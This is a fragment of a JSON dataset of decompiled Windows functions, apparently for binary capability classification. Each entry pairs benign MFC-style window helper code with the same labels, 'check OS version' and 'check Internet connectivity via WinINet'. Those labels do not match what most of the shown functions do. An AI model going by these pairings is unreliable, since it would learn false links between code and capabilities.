        "decompiled_code": "\nvoid __thiscall fcn.0041bdbd(int32_t param_1, uint param_2, uint param_3)\n\n{\n    if (*(param_1 + 0x4c) == 0) {\n        (*_sym.imp.USER32.dll_SetDlgItemTextA)(*(param_1 + 0x20), param_2, param_3);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bddc. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x4c) + 0x88))();\n    return;\n}\n",
        "token_count": 143
    },
    "0041be35": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041be35(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x20), 0xfffffff0);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041be4c. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x78))();\n    return;\n}\n",
        "token_count": 129
    },
    "0041be4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041be4f(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowLongA)(*(param_1 + 0x20), 0xffffffec);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041be66. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x7c))();\n    return;\n}\n",
        "token_count": 129
    },
    "0041be69": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041be69(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        fcn.0041604d(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041be8d. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0x80))();\n    return;\n}\n",
        "token_count": 149
    },
    "0041be93": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041be93(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        fcn.00416067(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041beb7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0x84))();\n    return;\n}\n",
        "token_count": 147
    },
    "0041bebd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041bebd(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 != 0) goto code_r0x0041bec9;\n    while( true ) {\n        fcn.00411e42();\ncode_r0x0041bec9:\n        iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x20));\n        if (iVar1 != 0) break;\n        if (*(param_1 + 0x50) != 0) {\ncode_r0x0041bedb:\n    // WARNING: Could not recover jumptable at 0x0041bee1. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(**(param_1 + 0x50) + 0x88))();\n            return;\n        }\n    }\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowTextA)(*(param_1 + 0x20), param_2);\n        return;\n    }\n    goto code_r0x0041bedb;\n}\n",
        "token_count": 259
    },
    "0041bf19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041bf19(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_SetWindowLongA)(*(param_1 + 0x20), 0xfffffff4, param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bf36. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x94))();\n    return;\n}\n",
        "token_count": 138
    },
    "0041bf3c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041bf3c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_MoveWindow)(*(in_ECX + 0x20), arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        (**(**(in_ECX + 0x50) + 0x98))(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return;\n}\n",
        "token_count": 159
    },
    "0041bf7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041bf7a(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_ShowWindow)(*(param_1 + 0x20), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bf95. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xa0))();\n    return;\n}\n",
        "token_count": 131
    },
    "0041bf9b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bf9b(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_IsWindowEnabled)(*(param_1 + 0x20));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bfb0. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xa4))();\n    return;\n}\n",
        "token_count": 123
    },
    "0041bfb6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041bfb6(int32_t param_1, uint param_2)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(*(param_1 + 0x20), param_2);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bfd1. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xa8))();\n    return;\n}\n",
        "token_count": 131
    },
    "0041bfd7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bfd7(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0x50) == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_SetFocus)(*(param_1 + 0x20));\n        fcn.004185c5(uVar1);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041bff2. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xb0))();\n    return;\n}\n",
        "token_count": 143
    },
    "0041c09b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0041c09b(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    if ((*(param_1 + 0x50) == 0) && (*(param_2 + 0x4c) != 0)) {\n        (**(**(param_2 + 0x4c) + 0x9c))(param_1, param_3);\n    }\n    return;\n}\n",
        "token_count": 102
    },
    "0041c0c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c0c0(uint *param_1)\n\n{\n    if (param_1[1] != 0) {\n    // WARNING: Could not recover jumptable at 0x0041c0cb. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**(*param_1[1] + 0x78))();\n        return;\n    }\n    (*_sym.imp.USER32.dll_GetWindowLongA)(*param_1, 0xfffffff0);\n    return;\n}\n",
        "token_count": 117
    },
    "0041c2a1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c2a1(int32_t arg_8h, uint X, uint Y, uint cx, uint cy, uint uFlags)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        if (arg_8h != 0) {\n            arg_8h = *(arg_8h + 0x20);\n        }\n        (*_sym.imp.USER32.dll_SetWindowPos)(*(in_ECX + 0x20), arg_8h, X, Y, cx, cy, uFlags);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0041c2d7. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0x9c))();\n    return;\n}\n",
        "token_count": 199
    },
    "0041c2dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c2dd(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if ((param_1 != 0) && (*(param_1 + 0x50) == 0)) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(*(param_1 + 0x20));\n        iVar2 = fcn.0043290a(uVar1);\n        if ((iVar2 != 0) && (*(iVar2 + 0x4c) != 0)) {\n            (**(**(iVar2 + 0x4c) + 0x9c))(param_1, 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 160
    },
    "0041c3ba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041c3ba(int32_t *arg_8h, code *arg_ch)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t **ppiVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t in_ECX;\n    bool bVar9;\n    uint uVar10;\n    code *var_8h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_GetWindow;\n    if (*(in_ECX + 0x4c) == 0) {\n        piVar3 = NULL;\n    }\n    else {\n        if ((*(in_ECX + 0x3c) & 0x800) == 0) {\n            uVar10 = 5;\n            uVar4 = *(in_ECX + 0x20);\n            while( true ) {\n                uVar4 = (*pcVar2)(uVar4, uVar10);\n                iVar5 = fcn.004185c5(uVar4);\n                if (iVar5 == 0) break;\n                uVar8 = fcn.0041be4f();\n                if ((((uVar8 & 0x10000) != 0) && (uVar8 = fcn.0041be35(),  (uVar8 & 0x10000000) != 0)) &&\n                   (uVar8 = fcn.0041be35(),  (uVar8 & 0x8000000) == 0)) goto code_r0x0041c4af;\n                uVar4 = *(iVar5 + 0x20);\n                uVar10 = 2;\n            }\n        }\n        if (arg_ch == NULL) {\n            var_8h = 0x41684a;\n            arg_ch = 0x416647;\n        }\n        else {\n            var_8h = 0x41c387;\n            arg_ch = 0x41c1ca;\n        }\n        var_4h = (*arg_ch)();\njoined_r0x0041c45a:\n        do {\n            if (var_4h == 0) goto code_r0x0041c4af;\n            ppiVar6 = (*var_8h)(&var_4h);\n            piVar1 = *ppiVar6;\n            if (arg_8h == NULL) {\n                if (piVar1[1] == 0) {\n                    iVar5 = *piVar1;\n                }\n                else {\n                    iVar5 = *(piVar1[1] + 0x24);\n                }\n                if ((iVar5 != 0) && (iVar7 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar5 == iVar7)) break;\n                if (piVar1[1] == 0) goto joined_r0x0041c45a;\n                bVar9 = piVar1[1] == *(*(in_ECX + 0x4c) + 0x70);\n            }\n            else {\n                bVar9 = arg_8h == piVar1;\n            }\n        } while (!bVar9);\n        if (piVar1 == NULL) {\ncode_r0x0041c4af:\n            piVar3 = NULL;\n        }\n        else {\n            do {\n                if (var_4h == 0) {\n                    var_4h = (*arg_ch)();\n                }\n                ppiVar6 = (*var_8h)(&var_4h);\n                piVar3 = *ppiVar6;\n                uVar8 = fcn.0041c0c0();\n            } while ((piVar3 != piVar1) &&\n                    ((((uVar8 & 0x10000) == 0 || ((uVar8 & 0x8000000) != 0)) || ((uVar8 & 0x10000000) == 0))));\n        }\n    }\n    return piVar3;\n}\n",
        "token_count": 890
    },
    "0041c511": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c511(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint *puVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    if (*(in_ECX + 0x4c) == 0) {\n        return;\n    }\n    if (arg_8h == NULL) {\n        return;\n    }\n    if ((arg_8h[2] == 0) ||\n       (iVar2 = (*_sym.imp.USER32.dll_SendMessageA)(*arg_8h, 0xf0, 0, 0),  puVar4 = arg_8h,  iVar2 != 1)) {\n        puVar3 = fcn.00433140(arg_8h, 0);\n        puVar6 = &arg_8h;\n        arg_8h = puVar3;\n        fcn.00416670(puVar6);\n        do {\n            if (arg_8h == NULL) {\ncode_r0x0041c5b6:\n                arg_8h = puVar3;\n                fcn.0041c1e7(&arg_8h, puVar6);\n                while( true ) {\n                    if (arg_8h == NULL) {\n                        return;\n                    }\n                    puVar4 = fcn.0041c1e7(&arg_8h);\n                    puVar4 = *puVar4;\n                    if ((puVar4[2] != 0) && (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 == 1)) break;\n                    uVar5 = fcn.0041c0c0();\n                    if ((uVar5 & 0x20000) != 0) {\n                        return;\n                    }\n                }\n                break;\n            }\n            puVar6 = &arg_8h;\n            puVar4 = fcn.00416670();\n            puVar4 = *puVar4;\n            uVar5 = fcn.0041c0c0();\n            if ((uVar5 & 0x20000) != 0) goto code_r0x0041c5b6;\n        } while ((puVar4[2] == 0) || (iVar2 = (*pcVar1)(*puVar4, 0xf0, 0, 0),  iVar2 != 1));\n    }\n    (*pcVar1)(*puVar4, 0xf1, 0, 0);\n    return;\n}\n",
        "token_count": 605
    },
    "0041c643": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0041c643(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    fcn.0041c17e(param_1);\n    iVar1 = param_2;\n    while ((0 < iVar1 && (*(param_1 + 4) != 0))) {\n        if (*(param_2 + 4) != 0) {\n            fcn.0041c1ce(param_2 + 4);\n        }\n        iVar1 = iVar1 + -1;\n    }\n    return param_2;\n}\n",
        "token_count": 131
    },
    "0041c69d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0041c69d(uint lpString, uint nMaxCount)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    if (*(extraout_ECX + 0x50) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*(extraout_ECX + 0x20), *(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    else {\n        uVar2 = fcn.0042407a();\n        fcn.0040f840(uVar2);\n        iVar1 = **(extraout_ECX + 0x50);\n        *(unaff_EBP + -4) = 0;\n        (**(iVar1 + 0x8c))(unaff_EBP + -0x10);\n        fcn.00411e90(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + -0x10), 0xffffffff);\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        fcn.00402740();\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 338
    },
    "0041ca0f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ca0f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_ECX + 0x4c) != 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.0041c8a7();\n        }\n        else {\n            iVar1 = fcn.0041c85e(arg_8h);\n        }\n        if ((iVar1 != 0) && (fcn.0041c994(),  iVar1 != 0)) {\n            return *(iVar1 + 8);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 164
    },
    "0041ca5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ca5d(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_ECX + 0x4c) != 0) {\n        if (arg_8h == 0) {\n            iVar1 = fcn.0041c8a7();\n        }\n        else {\n            iVar1 = fcn.0041c85e(arg_8h);\n        }\n        if ((iVar1 != 0) && (fcn.0041c919(),  iVar1 != 0)) {\n            return *(iVar1 + 8);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 164
    },
    "0041cd5d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t ** fcn.0041cd5d(int32_t **param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t **ppiVar3;\n    \n    piVar2 = (**(**param_1 + 0x10))();\n    ppiVar3 = param_1 + 3;\n    if ((*ppiVar3 < 0) || (piVar2 != *param_1)) {\n        ppiVar3 = (***piVar2)(param_1[1], 1);\n        if (ppiVar3 == NULL) {\n            fcn.00401280(0x8007000e);\n            pcVar1 = swi(3);\n            ppiVar3 = (*pcVar1)();\n            return ppiVar3;\n        }\n        ppiVar3[1] = param_1[1];\n        fcn.0045f3a0(ppiVar3 + 4, param_1[1] + 1, param_1 + 4, param_1[1] + 1);\n    }\n    else {\n        LOCK();\n        *ppiVar3 = *ppiVar3 + 1;\n        ppiVar3 = param_1;\n    }\n    return ppiVar3;\n}\n",
        "token_count": 277
    },
    "0041d369": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0041d369(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    iVar2 = *param_2;\n    piVar1 = iVar2 + -0x10;\n    piVar3 = *param_1 + -0x10;\n    if (piVar1 != piVar3) {\n        if ((*(*param_1 + -4) < 0) || (*piVar1 != *piVar3)) {\n            fcn.004138da(iVar2, *(iVar2 + -0xc));\n        }\n        else {\n            iVar2 = fcn.0041cd5d(piVar1);\n            fcn.00402740();\n            *param_1 = iVar2 + 0x10;\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 207
    },
    "0041d6d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d6d5(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    uint *puVar1;\n    bool bVar2;\n    uint var_4h;\n    \n    bVar2 = false;\n    puVar1 = arg_8h * 0x14 + *(in_ECX + 0x78);\n    *puVar1 = arg_ch;\n    if (puVar1[2] != arg_10h) {\n        bVar2 = ((puVar1[2] ^ arg_10h) & 0x8000000) == 0;\n        if (bVar2) {\n            puVar1[3] = puVar1[3] | 1;\n            puVar1[2] = arg_10h;\n            fcn.0041d433(arg_8h, puVar1[4], 1);\n        }\n        bVar2 = !bVar2;\n        puVar1[2] = arg_10h;\n    }\n    if (arg_14h != puVar1[1]) {\n        puVar1[1] = arg_14h;\n        bVar2 = true;\n    }\n    if (bVar2) {\n        fcn.0041d51e(1, 0);\n    }\n    return;\n}\n",
        "token_count": 312
    },
    "0041dfc6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041dfc6(uint hModule, int32_t hResInfo, int32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    int32_t *arg_8h;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint uVar9;\n    int32_t *piVar10;\n    uint uVar11;\n    uint uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint hResData;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar5 = (*_sym.imp.KERNEL32.dll_LoadResource)(hModule, hResInfo);\n    piVar10 = piVar5;\n    if ((piVar5 != NULL) && (piVar6 = (*_sym.imp.KERNEL32.dll_LockResource)(piVar5),  piVar10 = piVar6,  piVar6 != NULL)\n       ) {\n        iVar14 = *piVar6 + 0x40;\n        arg_8h = fcn.0045ea05(iVar14);\n        piVar10 = arg_8h;\n        if (arg_8h != NULL) {\n            fcn.0041314e(arg_8h, iVar14, piVar6, iVar14);\n            pcVar3 = _sym.imp.USER32.dll_GetSysColor;\n            iVar14 = *arg_8h;\n            hResInfo = 0;\n            do {\n                puVar1 = arg_8h + hResInfo * 4 + iVar14;\n                iVar13 = 0;\n                do {\n                    if (*puVar1 == *(iVar13 * 8 + 0x493cd4)) {\n                        if (arg_10h == 0) {\n                            puVar2 = iVar13 * 8 + 0x493cd8;\n                            uVar7 = (*pcVar3)(*puVar2);\n                            uVar4 = (*pcVar3)(*puVar2);\n                            uVar8 = (*pcVar3)(*puVar2);\n                            *puVar1 = uVar8 >> 0x10 & 0xff | (uVar4 << 8 | uVar7 >> 8 & 0xff) << 8;\n                        }\n                        else if (*(iVar13 * 8 + 0x493cd8) != 0x12) {\n                            *puVar1 = 0xffffff;\n                        }\n                        break;\n                    }\n                    iVar13 = iVar13 + 1;\n                } while (iVar13 < 4);\n                hResInfo = hResInfo + 1;\n            } while (hResInfo < 0x10);\n            iVar14 = arg_8h[1];\n            iVar13 = arg_8h[2];\n            uVar9 = (*_sym.imp.USER32.dll_GetDC)(0);\n            piVar10 = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(uVar9, iVar14, iVar13);\n            if (piVar10 != NULL) {\n                uVar11 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(uVar9);\n                pcVar3 = _sym.imp.GDI32.dll_SelectObject;\n                uVar12 = (*_sym.imp.GDI32.dll_SelectObject)(uVar11, piVar10);\n                (*_sym.imp.GDI32.dll_StretchDIBits)\n                          (uVar11, 0, 0, iVar14, iVar13, 0, 0, iVar14, iVar13, \n                           piVar6 + (1 << (*(arg_8h + 0xe) & 0x1f)) + 10, arg_8h, 0, 0xcc0020);\n                (*pcVar3)(uVar11, uVar12);\n                (*_sym.imp.GDI32.dll_DeleteDC)(uVar11);\n            }\n            (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar9);\n            fcn.0045e756(arg_8h);\n            (*_sym.imp.KERNEL32.dll_FreeResource)(piVar5);\n        }\n    }\n    return piVar10;\n}\n",
        "token_count": 938
    },
    "0041ead3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041ead3(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    uint dwNewLong;\n    int32_t var_4h;\n    \n    iVar3 = 0;\n    dwNewLong = 0;\n    var_4h = 0;\n    if (0x40046 < *0x4b66f8) {\n        dwNewLong = fcn.0041be35();\n        iVar3 = fcn.0041be69(0, 0x8800, 0);\n        if (0x5ffff < *0x4b66f8) {\n            if (in_ECX == 0) {\n                uVar1 = 0;\n            }\n            else {\n                uVar1 = *(in_ECX + 0x20);\n            }\n            iVar2 = (*_sym.imp.USER32.dll_IsWindow)(uVar1);\n            if (iVar2 != 0) {\n                fcn.0041df9c();\n                var_4h = fcn.0041dfaf();\n            }\n        }\n    }\n    iVar2 = fcn.00418521();\n    if (iVar2 != 0) {\n        *arg_8h = arg_ch;\n        arg_8h[1] = arg_ch >> 0x10;\n    }\n    if (iVar3 != 0) {\n        (*_sym.imp.USER32.dll_SetWindowLongA)(*(in_ECX + 0x20), 0xfffffff0, dwNewLong);\n    }\n    if (var_4h != 0) {\n        fcn.0041dfaf(var_4h);\n    }\n    return iVar2;\n}\n",
        "token_count": 394
    },
    "0041ed8f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
